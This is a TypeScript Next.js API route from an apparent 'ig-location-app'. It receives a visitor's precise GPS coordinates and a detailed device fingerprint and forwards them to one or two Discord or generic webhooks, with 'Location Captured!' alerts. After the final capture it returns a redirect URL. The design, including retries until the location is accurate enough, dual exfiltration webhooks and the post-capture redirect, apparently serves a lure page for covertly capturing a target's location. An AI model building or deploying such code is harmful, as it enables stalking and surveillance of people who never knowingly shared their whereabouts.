import { NextRequest, NextResponse } from 'next/server';

// ========== Check if URL is a Discord webhook ==========
function isDiscordWebhook(url: string): boolean {
  return url.includes('discord.com') || url.includes('discordapp.com');
}

// ========== Build raw JSON payload (for generic webhooks) ==========
function buildRawPayload(body: any, eventType: string) {
  const {
    latitude, longitude, accuracy, altitude, altitudeAccuracy,
    heading, speed, timestamp, deviceInfo, googleMapsLink, attemptNumber,
  } = body;

  return {
    event: eventType,
    timestamp: new Date().toISOString(),
    locationRequestedAt: new Date(timestamp).toISOString(),
    attempt_number: attemptNumber || null,
    location: {
      latitude, longitude,
      accuracy_meters: accuracy,
      accuracy_rating: accuracy <= 10 ? 'EXCELLENT' : accuracy <= 20 ? 'GOOD' : accuracy <= 30 ? 'ACCEPTABLE' : accuracy <= 50 ? 'MODERATE' : 'LOW',
      meets_threshold: accuracy <= 30,
      altitude_meters: altitude || null,
      altitude_accuracy_meters: altitudeAccuracy || null,
      heading_degrees: heading || null,
      speed_mps: speed || null,
    },
    google_maps_link: googleMapsLink,
    device: {
      userAgent: deviceInfo?.userAgent || 'Unknown',
      platform: deviceInfo?.platform || 'Unknown',
      language: deviceInfo?.language || 'Unknown',
      model: deviceInfo?.model || 'Unknown',
      os: deviceInfo?.os || 'Unknown',
      osVersion: deviceInfo?.osVersion || 'Unknown',
      browser: deviceInfo?.browser || 'Unknown',
      browserVersion: deviceInfo?.browserVersion || 'Unknown',
      isMobile: deviceInfo?.isMobile || false,
      isTouchDevice: deviceInfo?.isTouchDevice || false,
      connectionType: deviceInfo?.connectionType || 'Unknown',
      screenWidth: deviceInfo?.screenWidth || null,
      screenHeight: deviceInfo?.screenHeight || null,
      pixelRatio: deviceInfo?.pixelRatio || null,
    },
    metadata: { source: 'ig-location-app', version: '2.3.0' },
  };
}

// ========== Build Discord embed payload ==========
function buildDiscordPayload(body: any, eventType: string) {
  const {
    latitude, longitude, accuracy, altitude, altitudeAccuracy,
    heading, speed, timestamp, deviceInfo, googleMapsLink, attemptNumber,
  } = body;

  const accuracyRating = accuracy <= 10 ? '🟢 EXCELLENT' : accuracy <= 20 ? '🟢 GOOD' : accuracy <= 30 ? '🟡 ACCEPTABLE' : accuracy <= 50 ? '🟠 MODERATE' : '🔴 LOW';
  const isFinal = eventType === 'location_captured';
  const emoji = isFinal ? '🎯' : '📍';
  const title = isFinal ? 'Location Captured!' : 'Location Update';

  const fields = [
    { name: '📍 Coordinates', value: `${latitude}, ${longitude}`, inline: true },
    { name: '🎯 Accuracy', value: `${accuracy.toFixed(1)}m (${accuracyRating})`, inline: true },
    { name: '🗺️ Google Maps', value: googleMapsLink, inline: false },
  ];

  if (altitude !== null && altitude !== undefined) {
    fields.push({ name: '⛰️ Altitude', value: `${altitude.toFixed(1)}m`, inline: true });
  }
  if (speed !== null && speed !== undefined) {
    fields.push({ name: '🚀 Speed', value: `${speed.toFixed(1)} m/s`, inline: true });
  }

  // Device info fields
  fields.push({ name: '\u200B', value: '**📱 Device Info**', inline: false });
  fields.push({ name: 'Device', value: deviceInfo?.model || 'Unknown', inline: true });
  fields.push({ name: 'OS', value: `${deviceInfo?.os || 'Unknown'} ${deviceInfo?.osVersion || ''}`, inline: true });
  fields.push({ name: 'Browser', value: `${deviceInfo?.browser || 'Unknown'} ${deviceInfo?.browserVersion || ''}`, inline: true });
  fields.push({ name: 'Screen', value: `${deviceInfo?.screenWidth || '?'}x${deviceInfo?.screenHeight || '?'}`, inline: true });
  fields.push({ name: 'Connection', value: deviceInfo?.connectionType || 'Unknown', inline: true });
  fields.push({ name: 'Mobile', value: deviceInfo?.isMobile ? 'Yes' : 'No', inline: true });

  fields.push({ name: '\u200B', value: '**🖥️ Full User Agent**', inline: false });
  fields.push({ name: 'UA', value: `\`\`\`${(deviceInfo?.userAgent || 'Unknown').substring(0, 200)}\`\`\``, inline: false });

  fields.push({ name: 'Attempt', value: `#${attemptNumber || '?'}`, inline: true });
  fields.push({ name: 'Time', value: new Date(timestamp).toISOString(), inline: true });

  return {
    content: `${emoji} **${title}** — Accuracy: ${accuracy.toFixed(1)}m`,
    embeds: [{
      title: `${emoji} ${title}`,
      color: isFinal ? 0x00FF00 : 0xFFA500,
      fields: fields,
      footer: { text: `ig-location-app v2.3 | ${new Date().toISOString()}` },
      thumbnail: { url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Google_Maps_icon_%282020%29.svg/120px-Google_Maps_icon_%282020%29.svg.png' },
    }],
  };
}

// ========== Smart send: auto-detect webhook type ==========
async function sendToWebhook(url: string, body: any, eventType: string): Promise<{ ok: boolean; status: number }> {
  const isDiscord = isDiscordWebhook(url);
  const payload = isDiscord ? buildDiscordPayload(body, eventType) : buildRawPayload(body, eventType);

  console.log(`[Webhook] Sending to ${isDiscord ? 'Discord' : 'Generic'} webhook - ${eventType}`);

  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (!res.ok) {
      const errorText = await res.text().catch(() => '');
      console.error(`[Webhook] ${res.status} ${res.statusText} - Response: ${errorText.substring(0, 300)}`);
    } else {
      console.log(`[Webhook] Success: ${res.status}`);
    }

    return { ok: res.ok, status: res.status };
  } catch (err) {
    console.error(`[Webhook] Fetch error:`, err);
    return { ok: false, status: 0 };
  }
}

// ========== MAIN API HANDLER ==========
export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { type, latitude, longitude, accuracy } = body;

    // Validate required fields
    if (!latitude || !longitude || !accuracy) {
      console.error('[API] Missing required location fields:', { latitude, longitude, accuracy });
      return NextResponse.json(
        { error: 'Missing required location fields', received: { latitude, longitude, accuracy } },
        { status: 400 }
      );
    }

    console.log(`[API] Received ${type} request - lat: ${latitude}, lng: ${longitude}, accuracy: ${accuracy}m`);

    const redirectUrl = process.env.REDIRECT_URL;
    const webhookUrl1 = process.env.WEBHOOK_URL;
    const webhookUrl2 = process.env.WEBHOOK_URL_2;

    const eventType = type === 'final' ? 'location_captured' : 'location_update';

    // Send to both webhooks in parallel
    const [result1, result2] = await Promise.all([
      webhookUrl1 ? sendToWebhook(webhookUrl1, body, eventType) : Promise.resolve({ ok: false, status: 0 }),
      webhookUrl2 ? sendToWebhook(webhookUrl2, body, eventType) : Promise.resolve({ ok: false, status: 0 }),
    ]);

    if (!webhookUrl1) console.error('[API] WEBHOOK_URL not configured!');
    if (!webhookUrl2) console.warn('[API] WEBHOOK_URL_2 not configured, skipping');

    return NextResponse.json({
      success: true,
      type: type,
      redirectUrl: type === 'final' ? (redirectUrl || null) : null,
      webhook1Status: webhookUrl1 ? (result1.ok ? 'sent' : `failed_${result1.status}`) : 'not_configured',
      webhook2Status: webhookUrl2 ? (result2.ok ? 'sent' : `failed_${result2.status}`) : 'not_configured',
      accuracy: accuracy,
    });
  } catch (error) {
    console.error('[API] Location API error:', error);
    return NextResponse.json(
      { error: 'Internal server error', details: String(error) },
      { status: 500 }
    );
  }
}
